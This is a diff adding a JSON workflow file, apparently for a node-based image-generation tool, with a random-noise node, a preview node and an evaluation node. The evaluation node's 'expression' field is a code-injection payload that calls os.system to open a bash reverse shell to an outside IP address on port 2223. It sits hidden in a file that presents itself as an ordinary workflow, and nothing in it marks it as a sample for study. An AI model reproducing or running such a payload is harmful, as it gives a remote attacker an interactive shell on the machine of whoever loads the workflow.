@@ -1,0 +1,41 @@
+{
+  "1": {
+    "inputs": {
+      "expression": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2223 0>&1\"')",
+      "input_count": 3,
+      "print_to_console": "False",
+      "update": null,
+      "in1": [
+        "2",
+        0
+      ]
+    },
+    "class_type": "EvaluateMultiple3",
+    "_meta": {
+      "title": "EvaluateMultiple3"
+    }
+  },
+  "2": {
+    "inputs": {
+      "noise_seed": 278809747079434
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "RandomNoise"
+    }
+  },
+  "3": {
+    "inputs": {
+      "preview": "None",
+      "previewMode": false,
+      "source": [
+        "1",
+        0
+      ]
+    },
+    "class_type": "PreviewAny",
+    "_meta": {
+      "title": "Preview as Text"
+    }
+  }
+}
